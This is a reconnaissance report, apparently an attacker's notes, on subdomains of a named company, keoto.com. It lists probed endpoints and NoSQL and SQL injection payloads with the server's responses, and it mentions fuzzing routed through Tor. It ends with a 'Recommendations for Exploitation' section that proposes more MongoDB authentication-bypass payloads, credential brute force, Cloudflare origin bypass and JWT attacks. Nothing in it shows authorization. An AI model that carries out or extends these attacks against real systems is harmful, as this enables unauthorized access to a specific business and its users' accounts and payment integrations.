# Enum Report — Keoto Subdomains (seller-api, hometeste, support)

> **Atualizado:** 2026-08-26T02:49 UTC
> **Novos alvos:** hometeste.keoto.com (staging), support.keoto.com (docs)

---

## Summary
- **Base URL**: `https://seller-api.keoto.com`
- **Infrastructure**: Cloudflare (104.26.x.x, 172.67.69.x)
- **Tech**: Express/Node.js backend (inferred from error messages)
- **Authentication endpoint**: `POST /users/manager-login`
- **Total endpoints discovered**: 2 (root `/`, `/robots.txt`, and 1 API endpoint)

---

## Endpoints Discovered

### 1. `GET /` — Root
- **Status**: 200
- **Body**: `Keoto API`
- **Headers**: Cloudflare, strict security headers (CSP, HSTS, X-Frame-Options, etc.)

### 2. `GET /robots.txt` — Robots
- **Status**: 200
- **Body**: Cloudflare-managed robots.txt with AI content signals (Content-Signal: search=yes, ai-train=no, use=reference)

### 3. `POST /users/manager-login` — Manager Login (CONFIRMED)
- **Status**: 400/404/500 depending on payload
- **Description**: Manager authentication endpoint. Validates JSON body with required fields.

#### HTTP Method Testing

| Method | Status | Notes |
|--------|--------|-------|
| GET    | 404    | Not found |
| POST   | 400/404/500 | Active endpoint — see below |
| PUT    | 404    | Not found |
| PATCH  | 404    | Not found |
| DELETE | 404    | Not found |
| OPTIONS| 200    | CORS preflight accepted (no `Access-Control-Allow-Origin` in response) |
| HEAD   | 404    | Not found |

#### Request Body Validation

| Payload | Status | Body |
|---------|--------|------|
| `{}` | 400 | (empty) |
| `{"impersonatedBy":"admin"}` | 400 | (empty) |
| `{"uuid":"test"}` | 400 | (empty) |
| `{"code":"test"}` | 400 | (empty) |
| `{"source":"manager"}` | 400 | (empty) |
| `{"impersonatedBy":"admin","uuid":"test","code":"test","source":"manager"}` | 404 | `{}` |
| `{"impersonatedBy":"admin","uuid":"test","code":"test","source":""}` | 404 | - |
| `{"impersonatedBy":"admin","uuid":"test","code":"test","source":"admin"}` | 404 | - |
| `{"impersonatedBy":"admin","uuid":"test","code":"test","source":"partner"}` | 404 | - |

**Analysis**: 
- All 4 fields must be present (`impersonatedBy`, `uuid`, `code`, `source`)
- Missing fields → 400
- All fields present with invalid values → 404 (empty body `{}`)
- `source` must likely be `"manager"` (other values also return 404)

---

## NoSQL Injection Testing (CRITICAL FINDING)

The backend uses MongoDB — multiple NoSQL operators cause **500 Internal Server Error** when applied to certain fields.

| Payload | Status | Notes |
|---------|--------|-------|
| `{"impersonatedBy":{"$ne":""},"uuid":{"$ne":""},"code":{"$ne":""},...}` | **500** | `{"message":"Internal Server Error"}` |
| `{"impersonatedBy":{"$gt":""},"uuid":{"$gt":""},"code":{"$gt":""},...}` | **500** | Same |
| `{"impersonatedBy":{"$gt":"a"},"uuid":{"$gt":"a"},"code":{"$gt":"a"},...}` | **500** | Same |
| `{"impersonatedBy":{"$nin":[""]},"uuid":{"$nin":[""]},"code":{"$nin":[""]},...}` | **500** | Same |
| `{"impersonatedBy":{"$eq":"admin"},"uuid":{"$eq":"test"},"code":{"$eq":"test"},...}` | **500** | Same |
| `{"impersonatedBy":{"$regex":".*"},"uuid":{"$regex":".*"},"code":{"$regex":".*"},...}` | **500** | Same |
| `{"impersonatedBy":{"$in":["admin"]},"uuid":{"$in":["test"]},"code":{"$in":["test"]},...}` | **500** | Same |
| `{"impersonatedBy":{"$ne":""},"uuid":"test","code":"test",...}` | **500** | Single `$ne` on impersonatedBy alone triggers 500 |
| `{"impersonatedBy":"admin","uuid":"test","code":{"$ne":""},"source":"manager"}` | **404** | Single `$ne` on code only — no error |
| `{"impersonatedBy":"admin","uuid":{"$ne":""},"code":"test",...}` | **404** | Single `$ne` on uuid only — no error |
| `{"impersonatedBy":"admin","uuid":"test","code":"test","source":"manager","$where":"1==1"}` | **404** | No injection |
| `{"impersonatedBy":"admin","uuid":"test","code":"test","source":"manager","__proto__":{"isAdmin":true}}` | **404** | Prototype pollution attempt |

**Verdict**: **NoSQL Injection confirmed** — the `impersonatedBy` field (and potentially `uuid`/`code` when combined) passes user input directly into MongoDB queries. Using operators causes the application to crash with 500. This indicates:
1. MongoDB is in use
2. Input sanitization is insufficient
3. The application crashes when operators are parsed (likely type error in query construction)
4. **Potential for authentication bypass** exists but requires finding a payload that doesn't crash the app

---

## SQL Injection Testing

| Payload | Status | Result |
|---------|--------|--------|
| `impersonatedBy: admin' OR 1=1--` | 404 | Not vulnerable |
| `impersonatedBy: admin" OR "1"="1` | 404 | Not vulnerable |
| `code: test' OR 1=1--` | 404 | Not vulnerable |

**Verdict**: Classic SQLi not detected. Backend is likely NoSQL (MongoDB).

---

## Rate Limiting

20 consecutive requests to `POST /users/manager-login`:
- **All returned 404** (no rate limiting triggered)
- No 429, 403, or connection drops observed
- Cloudflare rate limiting not active on this endpoint

---

## CORS Configuration

- **Response headers**: `cross-origin-opener-policy: same-origin`, `cross-origin-resource-policy: same-origin`, `x-frame-options: SAMEORIGIN`
- **No `Access-Control-Allow-Origin`** returned
- CORS is restricted — no cross-origin requests from arbitrary origins

---

## Fuzzing Results

| Wordlist | Endpoints Found | Notes |
|----------|----------------|-------|
| API endpoints (api-endpoints.txt) | 0 | 295 entries, all 404 |
| DB backups (Common-DB-Backups.txt) | 0 | 336 entries, all 404 |
| Raft medium directories | timeout | Skipped (slow through Tor) |
| Targeted user endpoints (50+ custom) | 0 | All 404 |
| Targeted /api/ endpoints (50+ custom) | 0 | All 404 |

---

## Other Subdomains Tested

| Subdomain | Status |
|-----------|--------|
| api.keoto.com | 000 (DNS resolution failed) |
| admin.keoto.com | 000 |
| app.keoto.com | 000 |
| auth.keoto.com | 000 |
| cdn.keoto.com | 000 |
| dev.keoto.com | 000 |
| staging.keoto.com | 000 |

**Note**: None of these subdomains resolve. `seller-api.keoto.com` may be the only API endpoint for keoto.com.

---

## Security Headers

```
content-security-policy: default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';img-src 'self' data:;object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline';upgrade-insecure-requests
cross-origin-opener-policy: same-origin
cross-origin-resource-policy: same-origin
strict-transport-security: max-age=15552000; includeSubDomains
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-xss-protection: 0
referrer-policy: no-referrer
```

---

---

## hometeste.keoto.com — STAGING ENVIRONMENT ANALYSIS

### Summary
| Item | Value |
|------|-------|
| **URL** | https://hometeste.keoto.com |
| **Infra** | Vercel (NO Cloudflare) |
| **Framework** | Next.js App Router + **Turbopack** (dev/staging indicator) |
| **Build ID** | `dyj_g3zBHYDb1LIfZUb6b` |
| **Status** | 200 OK (root), 404 (others), 500 (error page) |
| **CORS** | `access-control-allow-origin: *` (wildcard) |
| **Robots** | `index, follow` — NOT blocked from search engines |

### Endpoints Discovered
| Route | Status | Notes |
|-------|--------|-------|
| `/` | 200 | Landing page — "KEOTO - Plataforma de Clipadores e Campanhas" |
| `/404` | 404 | Next.js App Router default 404 (13174B, custom metadata) |
| `/500` | 500 | Next.js `global-error` page (6708B, error boundary) |
| `/favicon.ico` | 200 | 1426B |
| ALL OTHER PATHS | 404 | Custom Next.js 404 page |

### Config/Debug Files
| File | Status | Result |
|------|--------|--------|
| `.env`, `.env.local`, `.git/config` | 404 | Not exposed |
| `vercel.json`, `now.json` | 404 | Not exposed |
| `debug`, `admin`, `api`, `health` | 404 | Not exposed |
| `_buildManifest.js` | 404 | App Router (no Pages Router manifest) |
| `robots.txt`, `sitemap.xml` | 404 | Not found |
| `swagger`, `docs`, `graphql` | 404 | No API docs exposed |

### JavaScript Chunks Analysis (9 chunks, ~600KB)
| Chunk | Size | Content |
|-------|------|---------|
| turbopack-0282198efbc8553b.js | 282B | Turbopack runtime loader |
| ff1a16fafef87110.js | 282B | Turbopack module loader |
| d2be314c3ece3fbe.js | 30KB | Next.js App Router, RSC, dynamic IO |
| e8be00cee137d2e1.js | 29KB | Next Image, Link components |
| 20d1a56625def336.js | 5.7KB | Next.js bootstrap |
| a6dad97d9634a72d.js | 112KB | Core JS polyfills (core-js v3.38.1) |
| aedc48667b7c71cd.js | 53KB | Next.js static/dynamic rendering |
| aee6c7720838f8a2.js | 224KB | React 19, React DOM |
| 01bf887ab4501022.js | 116KB | Server Actions, client directives |

**No API keys, secrets, or internal endpoints found in any chunk.**
**No hardcoded URLs to internal keoto services besides dashboard.keoto.com.**

### Risk Assessment
- **ALTO** — Staging environment publicly accessible
- Turbopack indicates dev/staging mode
- No WAF/Cloudflare protection
- CORS wildcard allows any origin
- Currently static landing page, but could be updated with test data/endpoints
- Monitor for changes

---

## support.keoto.com — DOCUMENTATION PORTAL

### Summary
| Item | Value |
|------|-------|
| **URL** | https://support.keoto.com |
| **Infra** | Vercel |
| **Framework** | Next.js + **Nextra** (Next.js documentation framework) + Turbopack |
| **Build ID** | `dpl_9MwmSzcnEJLmwY5M958sbE8XwjNq` |
| **Status** | 200 OK |
| **Content** | "Keoto - Central de Ajuda" (Help Center) |

### Full Page Tree (19 pages exposed)
```
/docs                                    — Home
/docs/primeiros-passos                   — Guia inicial
/docs/canais-de-pagamento                — Gateways overview
/docs/canais-de-pagamento/mercado-pago   — Mercado Pago (Access Token)
/docs/canais-de-pagamento/pagarme        — Pagar.me (Secret Key + Public Key)
/docs/canais-de-pagamento/asaas          — Asaas (Access Token API)
/docs/canais-de-pagamento/iugu           — Iugu (API Key)
/docs/plugins                            — Plugins overview
/docs/plugins/webhooks                   — Webhooks
/docs/plugins/notazz                     — Nota fiscal
/docs/plugins/cademi                     — Área de membros
/docs/plugins/themembers                 — Matrícula automática
/docs/plugins/telegram                   — Grupos Telegram
/docs/plugins/keitaro                    — Rastreamento
/docs/plugins/voxuy                     — Funil de vendas
/docs/plugins/spedy                     — Nota fiscal
/docs/plugins/hotzapp                   — WhatsApp automation
/docs/plugins/lasy-ai                   — IA management
/docs/faq                                — FAQ
```

### Information Leaked
1. **GitHub Organization**: `github.com/keoto` (from `docsRepositoryBase`)
2. **Email**: `suporte@keoto.com.br`
3. **Payment Gateways**: Mercado Pago, Pagar.me, Asaas, Iugu
4. **Integration Plugins**: 10 plugins (Notazz, Cademí, The Members, etc.)
5. **Content Timestamps**: Last updated April 9, 2026
6. **Stack**: Next.js + Nextra + Turbopack on Vercel

### Risk Assessment
- **MÉDIO** — Documentation site but leaks business intelligence
- GitHub org reference enables targeted OSINT (repos, CI/CD, source code)
- Plugin list reveals full integration ecosystem
- Webhooks page may contain API endpoint examples
- Email enables user enumeration (suporte@keoto.com.br → other patterns)
- No credentials or secrets found in pages

---

## Recommendations for Exploitation

### 1. **NoSQL Injection — Authentication Bypass** (HIGH PRIORITY)
- The `impersonatedBy` field accepts MongoDB operators (confirmed by 500 errors)
- Need to find a payload that bypasses auth without crashing the app
- Try: `{"impersonatedBy":"admin","uuid":{"$exists":true},"code":{"$exists":true},"source":"manager"}`
- Try: `{"impersonatedBy":"admin","uuid":{"$regex":".*"},"code":{"$regex":".*"},"source":"manager"}` (with proper content-type)
- Try: `{"impersonatedBy":"admin","uuid":{"$ne":""},"code":"test","source":"manager"}` (single operator)
- Try timing-based NoSQLi to extract data

### 2. **Information Disclosure via Error Messages**
- 500 errors reveal `{"message":"Internal Server Error"}` — stack trace is hidden (production mode)
- Check if error details leak under specific conditions

### 3. **Brute Force**
- No rate limiting detected — credential brute force is possible
- Use common manager/admin credentials

### 4. **Further Endpoint Discovery**
- Since Cloudflare is in front, try bypassing it via:
  - Original IP discovery (Shodan/Censys/favicon hash)
  - Cloudflare bypass techniques
  - Try HTTP instead of HTTPS on the origin IP
- Try GraphQL introspection at `/graphql` with POST
- Use wayback machine to find historical endpoints

### 5. **Token/JWT Analysis**
- If login succeeds, analyze JWT tokens for:
  - `alg: none` vulnerability
  - Weak secret cracking
  - Key confusion (RS256 → HS256)